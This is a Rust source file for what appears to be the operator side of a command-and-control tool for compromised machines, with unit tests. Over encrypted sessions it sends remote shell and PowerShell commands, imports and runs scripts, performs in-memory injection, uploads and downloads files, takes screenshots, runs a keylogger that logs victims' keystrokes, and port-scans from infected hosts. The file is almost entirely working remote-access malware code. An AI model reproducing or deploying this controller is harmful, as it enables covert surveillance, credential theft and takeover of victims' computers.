use base64::{engine::general_purpose, Engine as _};
use rand::rngs::OsRng;
use simple_crypt::{decrypt, encrypt};
use std::collections::HashMap;
use std::fs::File;
use std::io::{BufReader, Read, Write};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio::task::JoinHandle;
use tokio::time::{timeout, Duration};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};

pub struct ConnectionInfo {
    pub id: usize,
    pub stream: Arc<Mutex<TcpStream>>,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub shared_secret: [u8; 32],
    pub connected_at: String,
}

pub async fn handle_importpsh(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err("Invalid command, expected 'import-psh ID SCRIPT_NAME'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let script_name = parts[2].trim();
    if !active_connections.lock().await.values().any(|v| v.id == id) {
        return Err("Invalid ID".to_string());
    }
    let script_file = match File::open(script_name) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error reading script file {}", script_name)),
    };
    let mut reader = BufReader::new(script_file);
    let mut buffer = Vec::new();
    reader.read_to_end(&mut buffer).unwrap();
    let encoded_script = general_purpose::STANDARD.encode(&buffer);

    let import_cmd = b"||IMPORTSCRIPT|| ";
    let active_connections = active_connections.lock().await;
    let connection_info = match active_connections.values().find(|v| v.id == id) {
        Some(c) => c,
        None => return Err("Invalid ID".to_string()),
    };
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let encrypted_cmd = encrypt(import_cmd, &shared_secret).unwrap();

    stream
        .lock()
        .await
        .write(&encrypted_cmd)
        .await
        .expect("Error writing to stream");
    for chunk in encoded_script.as_bytes().chunks(956) {
        let encrypted_command = encrypt(chunk, &shared_secret).expect("Failed to encrypt");
        stream
            .lock()
            .await
            .write(&encrypted_command)
            .await
            .expect("Error writing to stream");
    }
    stream
        .lock()
        .await
        .write(&encrypt(b" |!!done!!|", &shared_secret).unwrap())
        .await
        .expect("Error writing to stream");
    stream
        .lock()
        .await
        .flush()
        .await
        .expect("Error flushing stream");

    let mut message = [0; 1024];
    stream
        .lock()
        .await
        .read(&mut message)
        .await
        .expect("Error reading from stream");
    let data = decrypt(&message, &shared_secret).expect("Failed to decrypt");
    let response = match String::from_utf8(data) {
        Ok(response) => response,
        Err(_) => return Err("Error converting response to string".to_string()),
    };
    Ok(response)
}

pub async fn handle_run_script(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err(format!(
            "Invalid command, expected '{} ID command'",
            parts[0]
        ));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let function_name = parts[2].trim().to_string();
    let active_connections = active_connections.lock().await;

    if !active_connections.values().any(|v| v.id == id) {
        return Err("Invalid ID".to_string());
    }
    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let command = format!("||RUNSCRIPT|| {}", function_name);

    let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream
        .lock()
        .await
        .write(&encrypted_command)
        .await
        .expect("Error writing to stream");
    stream
        .lock()
        .await
        .flush()
        .await
        .expect("Error flushing stream");
    let mut cmdout = String::new();
    while !cmdout.contains("||cmd||") {
        let mut buffer = [0; 1024];
        let _ = match stream.lock().await.read(&mut buffer).await {
            Ok(n) => n,
            Err(_) => break,
        };
        let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
        cmdout.push_str(&String::from_utf8(data).unwrap());
    }
    cmdout = cmdout.replace("||cmd||", "");
    Ok(cmdout.trim().to_string())
}

pub async fn handle_in_memory(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(4, ' ').collect();
    if parts.len() < 3 {
        return Err(format!(
            "Invalid command, expected '{} ID command'",
            parts[0]
        ));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let path = parts[2].trim().to_string();
    let args_export = if parts.len() == 4 {
        parts[3].trim().to_string()
    } else {
        String::new()
    };
    let active_connections = active_connections.lock().await;

    if !active_connections.values().any(|v| v.id == id) {
        return Err("Invalid ID".to_string());
    }
    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let command = format!("||INJECT|| {} {}", path, args_export);

    let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream
        .lock()
        .await
        .write(&encrypted_command)
        .await
        .expect("Error writing to stream");
    stream
        .lock()
        .await
        .flush()
        .await
        .expect("Error flushing stream");

    let mut buffer = [0; 1024];
    stream
        .lock()
        .await
        .read(&mut buffer)
        .await
        .expect("Error reading from stream");
    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
    Ok(String::from_utf8(data).unwrap())
}

pub async fn parse_client_info(
    stream: &mut Arc<Mutex<tokio::net::TcpStream>>,
) -> (String, String, SharedSecret) {
    let mut rbuffer = [0; 1024];
    let mut stream_lock = stream.lock().await;
    let tcp_stream: &mut tokio::net::TcpStream = &mut *stream_lock;

    let secret = EphemeralSecret::random_from_rng(&mut OsRng);
    let public = PublicKey::from(&secret);
    let public_bytes = public.as_bytes().to_vec();
    let mut buffer = [0; 32];

    tcp_stream.write(&public_bytes).await.unwrap();
    let result = timeout(Duration::from_secs(1), tcp_stream.read(&mut buffer)).await;
    match result {
        Ok(Ok(_)) => {}
        Ok(Err(err)) => {
            panic!("Error reading from stream: {:?}", err);
        }
        Err(_) => {
            return ("".to_string(), "".to_string(), secret.diffie_hellman(&public));
        }
    }

    let shared_secret = secret.diffie_hellman(&PublicKey::from(buffer));
    let result = timeout(Duration::from_secs(3), tcp_stream.read(&mut rbuffer)).await;
    match result {
        Ok(Ok(_)) => {
            let data = decrypt(&rbuffer, shared_secret.as_bytes()).expect("Failed to decrypt");
            let data_string = String::from_utf8(data).expect("Failed to convert to String");
            let parts: Vec<&str> = data_string.split("||").collect();
            if parts[1] == "ACSINFO" {
                return (parts[2].to_string(), parts[3].to_string(), shared_secret);
            } else {
                return ("".to_string(), "".to_string(), shared_secret);
            }
        }
        Ok(Err(err)) => {
            panic!("Error reading from stream: {:?}", err);
        }
        Err(_) => {
            panic!("Read operation timed out");
        }
    }
}

pub async fn handle_command(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err(format!(
            "Invalid command, expected '{} ID command'",
            parts[0]
        ));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let command_str = parts[2].trim().to_string();
    let active_connections = active_connections.lock().await;

    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let command_prefix = if command.starts_with("psh") {
        "||PSHEXEC||"
    } else {
        "||CMDEXEC||"
    };

    let command = format!("{} {}", command_prefix, command_str);
    let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream
        .lock()
        .await
        .write(&encrypted_command)
        .await
        .expect("Error writing to stream");
    stream
        .lock()
        .await
        .flush()
        .await
        .expect("Error flushing stream");
    let mut cmdout = String::new();
    while !cmdout.contains("||cmd||") {
        let mut buffer = [0; 65536];
        let _ = match stream.lock().await.read(&mut buffer).await {
            Ok(n) => n,
            Err(_) => break,
        };
        let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
        cmdout.push_str(&String::from_utf8(data).unwrap());
    }
    cmdout = cmdout.replace("||cmd||", "");
    Ok(cmdout.trim().to_string())
}

pub async fn handle_list(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
) -> String {
    use colored::Colorize;

    let connections = active_connections.lock().await;
    if connections.is_empty() {
        return format!("{} No active connections.\n", "[-]".red().bold());
    }

    let mut rows: Vec<&ConnectionInfo> = connections.values().collect();
    rows.sort_by_key(|c| c.id);

    let host_w = rows.iter().map(|c| c.hostname.len()).max().unwrap_or(7).max(7);
    let user_w = rows.iter().map(|c| c.username.len()).max().unwrap_or(8).max(8);
    let os_w = rows.iter().map(|c| c.os.len()).max().unwrap_or(2).max(2);

    let sep_len = 4 + host_w + 2 + user_w + 2 + os_w + 2 + 12;
    let mut out = String::new();

    out.push_str(&format!(
        " {:<3}  {:<host_w$}  {:<user_w$}  {:<os_w$}  {}\n",
        "ID".bold(),
        "Address".bold(),
        "Username".bold(),
        "OS".bold(),
        "Connected".bold(),
    ));
    out.push_str(&format!(" {}\n", "─".repeat(sep_len)));

    for c in rows {
        let id_col = format!("{:<3}", c.id);
        let host_col = format!("{:<host_w$}", c.hostname);
        let user_col = format!("{:<user_w$}", c.username);
        let os_col = format!("{:<os_w$}", c.os);

        out.push_str(&format!(
            " {}  {}  {}  {}  {}\n",
            id_col.cyan().bold(),
            host_col,
            user_col.green(),
            os_col,
            c.connected_at.dimmed(),
        ));
    }
    out
}

pub async fn handle_upload(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 4 {
        return Err("Invalid command, expected 'upload ID file destination'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let file_name = parts[2].trim();
    let destination = parts[3].trim();
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let file = match File::open(file_name) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error opening file {}", file_name)),
    };
    let mut reader = BufReader::new(file);
    let mut buffer = Vec::new();
    reader.read_to_end(&mut buffer).unwrap();
    let encoded_file = general_purpose::STANDARD.encode(&buffer);
    let upload_cmd = "||UPLOAD|| ".to_owned() + &destination;
    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let upload_cmd = encrypt(upload_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream
        .lock()
        .await
        .write(&upload_cmd)
        .await
        .expect("Error writing to stream");

    let combined_command = format!("{} |!!done!!|", encoded_file.trim());
    for chunk in combined_command.as_bytes().chunks(1024) {
        let encrypted_command = encrypt(chunk, &shared_secret).expect("Failed to encrypt");
        stream
            .lock()
            .await
            .write(&encrypted_command)
            .await
            .expect("Error writing to stream");
    }

    stream
        .lock()
        .await
        .flush()
        .await
        .expect("Error flushing stream");
    let mut response_buf = [0; 1024];
    let _ = match stream.lock().await.read(&mut response_buf).await {
        Ok(n) => n,
        Err(_) => return Err("Error reading from stream".to_string()),
    };
    let data = decrypt(&response_buf, &shared_secret).expect("Failed to decrypt");
    let response = match String::from_utf8(data) {
        Ok(response) => response,
        Err(_) => return Err("Error converting response to string".to_string()),
    };
    Ok(response)
}

pub async fn handle_download(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 4 {
        return Err("Invalid command, expected 'download ID file destination'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let download_input = parts[2].trim();
    let filename = parts[3].trim();
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let download_cmd = "||DOWNLOAD|| ".to_owned() + &download_input;
    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let download_cmd = encrypt(download_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");

    stream
        .lock()
        .await
        .write(&download_cmd)
        .await
        .expect("Error writing to stream");
    let mut file = match File::create(filename) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error creating file: {}", filename)),
    };
    let mut buffer = [0; 1024];
    let mut encoded_data = String::new();
    loop {
        match stream.lock().await.read(&mut buffer).await {
            Ok(_) => {
                let decrypted_data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
                let data = match String::from_utf8(decrypted_data) {
                    Ok(data) => data,
                    Err(_) => return Err("Error converting data to string".to_string()),
                };
                encoded_data.push_str(&data);
                if data.contains("|!!done!!|") {
                    break;
                }
            }
            Err(err) => return Err(format!("Error receiving data: {}", err)),
        }
    }
    encoded_data = encoded_data
        .replace("\r", "")
        .replace("\n", "")
        .replace(" |!!done!!|", "");
    let decoded_data = match general_purpose::STANDARD.decode(&encoded_data) {
        Ok(decoded_data) => decoded_data,
        Err(err) => return Err(format!("Error decoding data: {}", err)),
    };
    match file.write_all(&decoded_data) {
        Ok(_) => Ok(format!("DOWNLOAD: File saved to {}.", filename)),
        Err(err) => Err(format!("Error writing to file: {}", err)),
    }
}

pub async fn handle_screenshot(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 2 {
        return Err("Invalid command, expected 'screenshot ID'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let screenshot_cmd = "||SCREENSHOT|| ".to_owned();
    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let screenshot_cmd =
        encrypt(screenshot_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");

    stream
        .lock()
        .await
        .write(&screenshot_cmd)
        .await
        .expect("Error writing to stream");

    Ok(format!(
        "Screenshot command sent to {}.\nCheck in /tmp for linux or C:\\Windows\\Temp for windows",
        id
    ))
}

use once_cell::sync::Lazy;

static THREAD_HANDLE: Lazy<Arc<Mutex<Option<JoinHandle<Result<(), String>>>>>> =
    Lazy::new(|| Arc::new(Mutex::new(None)));

pub async fn handle_keylogger(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 3 {
        return Err("Invalid command, expected 'keylogger ID on/off'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let state = parts[2].trim();
    if state != "on" && state != "off" {
        return Err("Invalid state, expected 'on' or 'off'".to_string());
    }
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let keylogger_cmd = "||KEYLOGGER|| ".to_owned() + state;
    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let keylogger_cmd =
        encrypt(keylogger_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");

    if state == "off" {
        let mut thread_handle = THREAD_HANDLE.lock().await;
        if let Some(handle) = thread_handle.as_ref() {
            handle.abort();
            *thread_handle = None;
        }

        stream
            .lock()
            .await
            .write(&keylogger_cmd)
            .await
            .expect("Error writing to stream");
        return Ok(format!("Keylogger turned {}.\n", state));
    }

    if THREAD_HANDLE.lock().await.is_some() {
        return Err("Keylogger already running".to_string());
    }

    stream
        .lock()
        .await
        .write(&keylogger_cmd)
        .await
        .expect("Error writing to stream");

    let thread_handle = THREAD_HANDLE.as_ref();
    let handle = tokio::spawn(async move {
        let mut file = match File::create("keylogger.log") {
            Ok(file) => file,
            Err(_) => return Err("Error creating file".to_string()),
        };
        loop {
            let mut buffer = [0; 512];
            let _ = match stream.lock().await.read(&mut buffer).await {
                Ok(_) => {
                    let decrypted_data =
                        decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
                    let data = match String::from_utf8(decrypted_data) {
                        Ok(data) => data,
                        Err(_) => return Err("Error converting data to string".to_string()),
                    };
                    if data.contains("|!!done!!|") {
                        return Ok(());
                    }
                    println!("{}", data);
                    match file.write(data.as_bytes().trim_ascii()) {
                        Ok(_) => (),
                        Err(_) => return Err("Error writing to file".to_string()),
                    }
                    Ok(())
                }
                Err(err) => Err(format!("Error receiving data: {}", err)),
            };
        }
    });

    *thread_handle.lock().await = Some(handle);
    Ok(format!("Keylogger turned {}.\n", state))
}

pub async fn handle_port_scan(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 5 {
        return Err("Invalid command, expected 'portscan ID ip start_port end_port'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let ip = parts[2].trim();
    let num1 = parts[3];
    let num2 = parts[4];
    let port_scan_cmd = "||SCAN|| ".to_owned() + ip + " " + &num1 + " " + &num2;
    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let port_scan_cmd =
        encrypt(port_scan_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream
        .lock()
        .await
        .write(&port_scan_cmd)
        .await
        .expect("Error writing to stream");
    stream
        .lock()
        .await
        .flush()
        .await
        .expect("Error flushing stream");
    let mut buffer = [0; 1024];
    let _ = stream.lock().await.read(&mut buffer).await.unwrap();
    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
    let response = String::from_utf8(data).unwrap();
    let factor = format!("{}:", ip);
    let mut ports: Vec<&str> = response.split(&factor).collect();
    ports.remove(0);
    let formatted_response = ports.join(", ");
    Ok(format!("IP {} has port {} open", ip, formatted_response))
}

pub async fn handle_kill(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 2 {
        return Err("Invalid command, expected 'kill ID'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };

    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }

    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;

    let cmd = encrypt(b"||EXIT||", &shared_secret).expect("Failed to encrypt");
    stream
        .lock()
        .await
        .write(&cmd)
        .await
        .expect("Error writing to stream");
    stream
        .lock()
        .await
        .flush()
        .await
        .expect("Error flushing stream");
    Ok(format!("Kill command sent to {}.", id))
}

pub fn handle_exit() {
    println!("\nExiting");
    std::process::exit(0);
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn empty_map() -> Arc<Mutex<HashMap<String, ConnectionInfo>>> {
        Arc::new(Mutex::new(HashMap::new()))
    }

    async fn make_connection(id: usize, hostname: &str) -> ConnectionInfo {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let _ = listener.accept().await.unwrap();
        ConnectionInfo {
            id,
            stream: Arc::new(Mutex::new(stream)),
            hostname: hostname.to_string(),
            username: "testuser".to_string(),
            os: "linux".to_string(),
            shared_secret: [0u8; 32],
            connected_at: "2024-01-01".to_string(),
        }
    }

    // handle_list

    #[tokio::test]
    async fn list_empty_connections() {
        let result = handle_list(&empty_map()).await;
        assert!(result.contains("No active connections"));
    }

    #[tokio::test]
    async fn list_shows_connection_details() {
        let map = empty_map();
        let conn = make_connection(0, "192.168.1.1").await;
        map.lock().await.insert("192.168.1.1".to_string(), conn);
        let result = handle_list(&map).await;
        assert!(result.contains("192.168.1.1"));
        assert!(result.contains("testuser"));
        assert!(result.contains("linux"));
    }

    // handle_command

    #[tokio::test]
    async fn command_too_few_args() {
        let result = handle_command(&empty_map(), "cmd 0").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn command_non_numeric_id() {
        let result = handle_command(&empty_map(), "cmd abc whoami").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn command_unknown_id() {
        let result = handle_command(&empty_map(), "cmd 0 whoami").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_upload

    #[tokio::test]
    async fn upload_too_few_args() {
        let result = handle_upload(&empty_map(), "upload 0 file").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn upload_non_numeric_id() {
        let result = handle_upload(&empty_map(), "upload abc file dest").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn upload_unknown_id() {
        let result = handle_upload(&empty_map(), "upload 0 file dest").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_download

    #[tokio::test]
    async fn download_too_few_args() {
        let result = handle_download(&empty_map(), "download 0 file").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn download_non_numeric_id() {
        let result = handle_download(&empty_map(), "download abc file dest").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn download_unknown_id() {
        let result = handle_download(&empty_map(), "download 0 file dest").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_screenshot

    #[tokio::test]
    async fn screenshot_too_few_args() {
        let result = handle_screenshot(&empty_map(), "screenshot").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn screenshot_non_numeric_id() {
        let result = handle_screenshot(&empty_map(), "screenshot abc").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn screenshot_unknown_id() {
        let result = handle_screenshot(&empty_map(), "screenshot 0").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_keylogger

    #[tokio::test]
    async fn keylogger_too_few_args() {
        let result = handle_keylogger(&empty_map(), "keylogger 0").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn keylogger_invalid_state() {
        let result = handle_keylogger(&empty_map(), "keylogger 0 maybe").await;
        assert!(result.unwrap_err().contains("Invalid state"));
    }

    #[tokio::test]
    async fn keylogger_non_numeric_id() {
        let result = handle_keylogger(&empty_map(), "keylogger abc on").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn keylogger_unknown_id_on() {
        let result = handle_keylogger(&empty_map(), "keylogger 0 on").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_port_scan

    #[tokio::test]
    async fn port_scan_too_few_args() {
        let result = handle_port_scan(&empty_map(), "portscan 0 127.0.0.1 1").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn port_scan_non_numeric_id() {
        let result = handle_port_scan(&empty_map(), "portscan abc 127.0.0.1 1 100").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn port_scan_unknown_id() {
        let result = handle_port_scan(&empty_map(), "portscan 0 127.0.0.1 1 100").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_kill

    #[tokio::test]
    async fn kill_non_numeric_id() {
        let result = handle_kill(&empty_map(), "kill abc").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn kill_unknown_id() {
        let result = handle_kill(&empty_map(), "kill 0").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_importpsh

    #[tokio::test]
    async fn importpsh_too_few_args() {
        let result = handle_importpsh(&empty_map(), "import-psh 0").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn importpsh_non_numeric_id() {
        let result = handle_importpsh(&empty_map(), "import-psh abc script.ps1").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn importpsh_unknown_id() {
        let result = handle_importpsh(&empty_map(), "import-psh 99 script.ps1").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_run_script

    #[tokio::test]
    async fn run_script_too_few_args() {
        let result = handle_run_script(&empty_map(), "run-psh 0").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn run_script_non_numeric_id() {
        let result = handle_run_script(&empty_map(), "run-psh abc func").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn run_script_unknown_id() {
        let result = handle_run_script(&empty_map(), "run-psh 99 func").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    // handle_in_memory

    #[tokio::test]
    async fn in_memory_too_few_args() {
        let result = handle_in_memory(&empty_map(), "inject 0").await;
        assert!(result.unwrap_err().contains("Invalid command"));
    }

    #[tokio::test]
    async fn in_memory_non_numeric_id() {
        let result = handle_in_memory(&empty_map(), "inject abc path").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }

    #[tokio::test]
    async fn in_memory_unknown_id() {
        let result = handle_in_memory(&empty_map(), "inject 99 path").await;
        assert_eq!(result.unwrap_err(), "Invalid ID");
    }
}
